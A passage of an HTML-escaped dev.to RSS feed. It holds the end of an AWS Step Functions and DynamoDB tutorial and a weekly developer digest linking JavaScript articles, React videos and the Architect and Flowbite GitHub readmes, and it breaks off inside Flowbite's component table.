&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UZkkN9C5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2c7x0afxu0sbz0hyvbzg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UZkkN9C5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2c7x0afxu0sbz0hyvbzg.png" alt="Choice" width="880" height="404"&gt;&lt;/a&gt;&lt;br&gt;
During the &lt;em&gt;DynamoDB&lt;/em&gt; step we can view the details of what inputs was passed to the step and you can understand how the JSON mapping would have worked in that iteration.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--s_85ceGl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fn2o2uhhtd8r0ro6yrkv.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--s_85ceGl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fn2o2uhhtd8r0ro6yrkv.png" alt="Image description" width="880" height="378"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#dynamodb-queries"&gt;
  &lt;/a&gt;
  DynamoDB queries
&lt;/h3&gt;

&lt;p&gt;Once the execution is completed, all the text which is extracted from the document itself, you can find it in DynamoDB. And then you can build your DynamoDB &lt;code&gt;query&lt;/code&gt; and &lt;code&gt;scan&lt;/code&gt; which suits the search need. &lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#getting-all-the-keywords-of-an-image"&gt;
  &lt;/a&gt;
  Getting all the keywords of an image
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jotw5w9b--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/covstekcc4u5rkdn5dak.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jotw5w9b--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/covstekcc4u5rkdn5dak.png" alt="query" width="880" height="367"&gt;&lt;/a&gt; &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--fyjcRdKf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zyw3k8xnjrmzvpm06o0r.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fyjcRdKf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zyw3k8xnjrmzvpm06o0r.png" alt="all the keywords of an image" width="644" height="886"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#getting-all-the-images-which-matches-the-keyword"&gt;
  &lt;/a&gt;
  Getting all the images which matches the keyword
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--kMIGJdcf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oy5o5xkw8x40yvlurwuy.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kMIGJdcf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oy5o5xkw8x40yvlurwuy.png" alt="scan" width="880" height="549"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h3&gt;

&lt;p&gt;With Step Function and SDK integration it becomes a seemless low-code integration for your serverless workflows as explained in this blog-post. This also eliminates having Lambda functions which would be processing all of these. &lt;/p&gt;

</description>
      <category>aws</category>
      <category>stepfunctions</category>
      <category>serverless</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Weekly Digest 03/2022</title>
      <author>Marco Biedermann</author>
      <pubDate>Sun, 23 Jan 2022 18:20:31 +0000</pubDate>
      <link>https://dev.to/marcobiedermann/weekly-digest-032022-4jba</link>
      <guid>https://dev.to/marcobiedermann/weekly-digest-032022-4jba</guid>
      <description>&lt;p&gt;Welcome to my Weekly Digest #3 of this year.&lt;/p&gt;

&lt;p&gt;This weekly digest contains a lot of interesting and inspiring articles, videos, tweets, podcasts, and designs I consumed during this week.&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#interesting-articles-to-read"&gt;
  &lt;/a&gt;
  Interesting articles to read
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#ecmascript-proposal-grouping-arrays-via%C2%A0-raw-groupby-endraw-%C2%A0and%C2%A0-raw-groupbytomap-endraw-"&gt;
  &lt;/a&gt;
  ECMAScript proposal: grouping Arrays via &lt;code&gt;.groupBy()&lt;/code&gt; and &lt;code&gt;.groupByToMap()&lt;/code&gt;
&lt;/h3&gt;

&lt;p&gt;This blog post describes the ECMAScript proposal &lt;a href="https://github.com/tc39/proposal-array-grouping"&gt;“Array grouping”&lt;/a&gt; by Justin Ridgewell.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://2ality.com/2022/01/array-grouping.html"&gt;ECMAScript proposal: grouping Arrays via &lt;code&gt;.groupBy()&lt;/code&gt; and &lt;code&gt;.groupByToMap()&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#folding-the-dom"&gt;
  &lt;/a&gt;
  Folding the DOM
&lt;/h3&gt;

&lt;p&gt;In this post, we'll explore a technique we can use to "fold" a DOM node, like folding a letter in real life. On that journey, we'll learn a lot about 3D transforms and CSS animation techniques!&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.joshwcomeau.com/react/folding-the-dom/"&gt;Folding the DOM&lt;/a&gt;&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#some-great-videos-i-watched-this-week"&gt;
  &lt;/a&gt;
  Some great videos I watched this week
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#thinking-on-ways-to-solve-a-darklight-theme-switch"&gt;
  &lt;/a&gt;
  Thinking on ways to solve a dark/light theme switch
&lt;/h3&gt;

&lt;p&gt;In today's GUI Challenge, &lt;a href="https://www.youtube.com/channel/UCBGr3ZMcV5jke40_Wrv3fNA"&gt;@Adam Argyle&lt;/a&gt; shares thinking on a way to build a theme switch component. Often a website will allow switching the theme to something other than the system preference and these are thoughts on how to achieve that user experience.&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/kZiS1QStIWc"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;by &lt;a href="https://twitter.com/ChromiumDev"&gt;Google Chrome Developers&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#suspense-and-error-boundaries-in-react-18"&gt;
  &lt;/a&gt;
  Suspense and Error Boundaries in React 18
&lt;/h3&gt;

&lt;p&gt;Learn how Suspense allows you to use Error Boundaries for network requests by turning asynchronous exceptions into render-time errors.&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/h_vVsPwvcsg"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;by &lt;a href="https://twitter.com/samselikoff"&gt;Sam Selikoff&lt;/a&gt;&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#useful-github-repositories"&gt;
  &lt;/a&gt;
  Useful GitHub repositories
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#architect"&gt;
  &lt;/a&gt;
  Architect
&lt;/h3&gt;

&lt;p&gt;Build ultra-scalable database-backed web apps on AWS serverless infrastructure with full local, offline workflows, and more.&lt;/p&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--566lAguM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-5a155e1f9a670af7944dd5e12375bc76ed542ea80224905ecaf878b9157cdefc.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/architect"&gt;
        architect
      &lt;/a&gt; / &lt;a href="https://github.com/architect/architect"&gt;
        architect
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      The simplest, most powerful way to build serverless applications
    &lt;/h3&gt;
  &lt;/div&gt;
  &lt;div class="ltag-github-body"&gt;
    
&lt;div id="readme" class="md"&gt;
&lt;p&gt;&lt;a href="https://www.npmjs.com/package/@architect/architect" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/89d33186d93df5d4d9bbcfc6000bfd69e3054db45e33b54ffe3a9ce872a9f5a2/68747470733a2f2f6173736574732e6172632e636f6465732f6172636869746563742d6c6f676f2d353030624032782e706e67" width="500"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/architect/architect/actions?query=workflow%3A%22Node+CI%22"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JPzQ8Rn9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://github.com/architect/architect/workflows/Node%2520CI/badge.svg" alt="GitHub CI status"&gt;&lt;/a&gt; &lt;a href="https://badge.fury.io/js/%40architect%2Farchitect" rel="nofollow"&gt;&lt;img alt="npm version" src="https://camo.githubusercontent.com/592cfa6342d579391e1a3c33b9c077c53233e162ad7af993ea67b4c186142ef3/68747470733a2f2f62616467652e667572792e696f2f6a732f2534306172636869746563742532466172636869746563742e737667"&gt;&lt;/a&gt; &lt;a href="https://opensource.org/licenses/Apache-2.0" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/2a2157c971b7ae1deb8eb095799440551c33dcf61ea3d965d86b496a5a65df55/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d417061636865253230322e302d626c75652e737667" alt="Apache-2.0 License"&gt;&lt;/a&gt; &lt;a href="https://discord.com/invite/y5A2eTsCRX" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/1b966e4780d5e127cbf164e0ec49a584598f8819da4af5531e7aaeae3513bd57/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3838303237323235363130303630313932372e7376673f6c6162656c3d266c6f676f3d646973636f7264266c6f676f436f6c6f723d66666666666626636f6c6f723d353836354632266c6162656c436f6c6f723d67726579"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Build ultra scalable database backed web apps on AWS serverless infrastructure with full local, offline workflows, and more. Full documentation found at: &lt;a href="https://arc.codes" rel="nofollow"&gt;https://arc.codes&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;
Requirements&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Platforms:&lt;/strong&gt; Linux, macOS, Windows&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Architect runtime:&lt;/strong&gt; Node.js 14+&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Function runtimes &amp;amp; package managers:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Node.js (optional): &lt;a href="https://docs.aws.amazon.com/lambda/latest/dg/lambda-runtimes.html" rel="nofollow"&gt;supported versions&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://www.npmjs.com/" rel="nofollow"&gt;&lt;code&gt;npm&lt;/code&gt;&lt;/a&gt; (optional): 6+&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://yarnpkg.com/" rel="nofollow"&gt;&lt;code&gt;yarn&lt;/code&gt;&lt;/a&gt; (optional): 1+&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python (optional): &lt;a href="https://docs.aws.amazon.com/lambda/latest/dg/lambda-runtimes.html" rel="nofollow"&gt;supported versions&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://pip.pypa.io/en/stable/" rel="nofollow"&gt;&lt;code&gt;pip3&lt;/code&gt;&lt;/a&gt; (optional)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ruby (optional): &lt;a href="https://docs.aws.amazon.com/lambda/latest/dg/lambda-runtimes.html" rel="nofollow"&gt;supported versions&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://bundler.io/" rel="nofollow"&gt;&lt;code&gt;bundle&lt;/code&gt;&lt;/a&gt; (optional)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Additional function runtimes:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Java, .NET, Golang, Lambda runtime layers (optional): &lt;a href="https://docs.aws.amazon.com/lambda/latest/dg/lambda-runtimes.html" rel="nofollow"&gt;supported versions&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
Installation&lt;/h2&gt;
&lt;p&gt;Open your terminal to install &lt;code&gt;arc&lt;/code&gt; globally:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell position-relative overflow-auto js-code-highlight"&gt;
&lt;pre&gt;npm i -g &lt;a class="mentioned-user" href="https://dev.to/architect"&gt;@architect&lt;/a&gt;/architect&lt;/pre&gt;

&lt;/div&gt;
&lt;p&gt;Check the version:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell position-relative overflow-auto js-code-highlight"&gt;
&lt;pre&gt;arc version&lt;/pre&gt;

&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;Protip: run &lt;code&gt;arc&lt;/code&gt; with no arguments to get help&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;
Work locally&lt;/h2&gt;
&lt;p&gt;Create a new app:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell position-relative overflow-auto js-code-highlight"&gt;
&lt;pre&gt;mkdir testapp
&lt;span class="pl-c1"&gt;cd&lt;/span&gt; testapp
arc init&lt;/pre&gt;

&lt;/div&gt;
&lt;p&gt;Kick up the local dev server:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell position-relative overflow-auto js-code-highlight"&gt;
&lt;pre&gt;arc sandbox&lt;/pre&gt;

&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Cmd / Ctrl + c&lt;/code&gt; exits the sandbox&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;
Deploy to AWS&lt;/h2&gt;
&lt;p&gt;Deploy the &lt;code&gt;staging&lt;/code&gt; stack:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell position-relative overflow-auto js-code-highlight"&gt;
&lt;pre&gt;arc deploy&lt;/pre&gt;

&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;Protip: create additional &lt;code&gt;staging&lt;/code&gt; stacks with &lt;code&gt;--name&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ship to a &lt;code&gt;production&lt;/code&gt; stack:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell position-relative overflow-auto js-code-highlight"&gt;
&lt;pre&gt;arc deploy production&lt;/pre&gt;

&lt;/div&gt;
&lt;h2&gt;
Add&lt;/h2&gt;…&lt;/div&gt;
  &lt;/div&gt;
  &lt;div class="gh-btn-container"&gt;&lt;a class="gh-btn" href="https://github.com/architect/architect"&gt;View on GitHub&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;


&lt;h3&gt;
  &lt;a href="#flowbite"&gt;
  &lt;/a&gt;
  Flowbite
&lt;/h3&gt;

&lt;p&gt;Build websites even faster with components on top of Tailwind CSS&lt;/p&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--566lAguM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-5a155e1f9a670af7944dd5e12375bc76ed542ea80224905ecaf878b9157cdefc.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/themesberg"&gt;
        themesberg
      &lt;/a&gt; / &lt;a href="https://github.com/themesberg/flowbite"&gt;
        flowbite
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Tailwind CSS components and interactive elements
    &lt;/h3&gt;
  &lt;/div&gt;
  &lt;div class="ltag-github-body"&gt;
    
&lt;div id="readme" class="md"&gt;
&lt;p&gt;
    &lt;a href="https://flowbite.com" rel="nofollow"&gt;
      &lt;img alt="Flowbite - Tailwind CSS components" width="350" src="https://camo.githubusercontent.com/2556ddabc1abae4826d965b1c1351563687c75b088d25e5f050000b30cbcbe28/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f666c6f77626974652d6c6f676f2d746578742e737667"&gt;
    &lt;/a&gt;&lt;br&gt;
    Build websites even faster with components on top of Tailwind CSS
&lt;/p&gt;

&lt;p&gt;
    &lt;a href="https://discord.com/invite/4eeurUVvTy" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/2b34e34429b23763f440f752bc633d83ab3e9109445f8fcafbfe63c983425961/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3930323931313631393033323537363039303f636f6c6f723d253233373238396461266c6162656c3d446973636f7264" alt="Discord"&gt;&lt;/a&gt;
    &lt;a href="https://www.npmjs.com/package/@themesberg/flowbite" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/cc853aca382ff8b68637cd4e674a65982b21412eac868150893f0c7c42a26660/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f64742f407468656d6573626572672f666c6f77626974652e737667" alt="Total Downloads"&gt;&lt;/a&gt;
    &lt;a href="https://github.com/themesberg/flowbite/releases"&gt;&lt;img src="https://camo.githubusercontent.com/6315fea49b738f7e2eb7ebc091e78979df33d21f77d88bea4469469f59668dea/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f762f407468656d6573626572672f666c6f77626974652e737667" alt="Latest Release"&gt;&lt;/a&gt;
    &lt;a href="https://flowbite.com/docs/getting-started/license/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/2bb630e2707a04100cd270fd944d22816241c37b68a5a1629257920c65e17891/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d4d49542d626c7565" alt="Licenese"&gt;&lt;/a&gt;
&lt;/p&gt;




&lt;h2&gt;
Documentation&lt;/h2&gt;
&lt;p&gt;For full documentation, visit &lt;a href="https://flowbite.com/" rel="nofollow"&gt;flowbite.com&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;
Components&lt;/h2&gt;
&lt;p&gt;Flowbite is an open source collection of UI components built with the utility classes from Tailwind CSS that you can use as a starting point when coding user interfaces and websites.&lt;/p&gt;
&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
  &lt;tbody&gt;
&lt;tr&gt;
    &lt;td width="33.3333%"&gt;Alerts&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Badge&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Breadcrumbs&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/alerts/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Alerts" src="https://camo.githubusercontent.com/a4e039ab06b8eeb12916bed90e0ef4ed6dfa62a0e53bd431a31e9e6633bfc0fe/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f616c657274732e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/badge/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Badge" src="https://camo.githubusercontent.com/bdf2356a261438f793f116389e29d4152e0c308308084748172a118f9d0c5a87/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f62616467652e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/breadcrumb/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Breadcrumbs" src="https://camo.githubusercontent.com/387f247fad735778d1738963bb2ee6c6f66df05c6759faf435ef217d47e73048/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f62726561646372756d62732e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;Buttons&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Button group&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Cards&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/buttons/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Buttons" src="https://camo.githubusercontent.com/235400c51f6ee51236e463b51352d3b5b5a4809d37ecd24668bf858b93a8d1b4/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f627574746f6e732e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/button-group/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Button Group" src="https://camo.githubusercontent.com/57d79de165525a202be0db0efe637a8aeb18da28a11bf3c0f4a3cc31f193f6c7/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f627574746f6e2d67726f75702e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/card/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Cards" src="https://camo.githubusercontent.com/90c9a6a563b185fede19adb30003b5c230968144af5c9537549b9601df92db18/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f63617264732e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;Dropdown&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Forms&lt;/td&gt;
    &lt;td width="33.3333%"&gt;List group&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/dropdowns/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Dropdown" src="https://camo.githubusercontent.com/81b01016332e19be25a8f316b21439d18b3fe95ff1ecdd7198119edefb508524/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f64726f70646f776e2e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/forms/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Forms" src="https://camo.githubusercontent.com/959dfd86ab431555545c9c0f5ca32dc00cf22acccb7d2d484cd3e177cde6233c/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f666f726d732e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/list-group/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS List group" src="https://camo.githubusercontent.com/fabfad2f0b837f7148fbdacbf5de6a62bfcab1d5268caba4855b486f4daa46a4/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f6c6973742d67726f75702e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;Typography&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Modal&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Tabs&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/typography/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Typography" src="https://camo.githubusercontent.com/4f7813c3b64c87a16836270868f29d15bc2b8e7c71792675658e47dfde1d049b/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f7479706f6772617068792e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/modal/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Modal" src="https://camo.githubusercontent.com/3efee21672b5e08f9faa1949de18f8108ef90f0ef236650406aa2269e5210aa2/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f6d6f64616c2e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/tabs/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Tabs" src="https://camo.githubusercontent.com/207b079aa8892f0c5ad918bdc5b51747d54514a86d0e2bb6936157f5dfd6fff5/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f746162732e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;Navbar&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Pagination&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Timeline&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/navbar/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Navbar" src="https://camo.githubusercontent.com/5decdf55880e10c84a33969d255ad2d1322aec221c9e08036e665e8c1174522e/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f6e61766261722e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/pagination/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Pagination" src="https://camo.githubusercontent.com/70e0dddb963f99fa8a864056d925567bc591872a947c70571a12fe0725127b92/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f706167696e6174696f6e2e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/timeline/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Timeline" src="https://camo.githubusercontent.com/4be0d1998bba2263876d07bad1d126eef3cc649a8dd31b5eb1eef181d3cc0fb4/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f74696d656c696e652e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;Progress bar&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Tables&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Toast&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/progress/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Progress Bar" src="https://camo.githubusercontent.com/41a4ac3161299ae6da67482a9f133b28711c4bb48d11e4a8ba8e445c58485dda/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f70726f67726573732e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/tables/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Tables" src="https://camo.githubusercontent.com/f164d3c783814c3b23795687d6be389b42e71ecafb2d92e1aeb0260c1bfca2ef/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f7461626c65732e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/toast/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Toast" src="https://camo.githubusercontent.com/db48df5814f9973b71125aae1c82a5066a7945828b4966018b1f2d5b47152024/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f746f6173742e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;Tooltips&lt;/td&gt;
    &lt;td width="33.3333%"&gt;Datepicker&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/components/tooltips/" rel="nofollow"&gt;
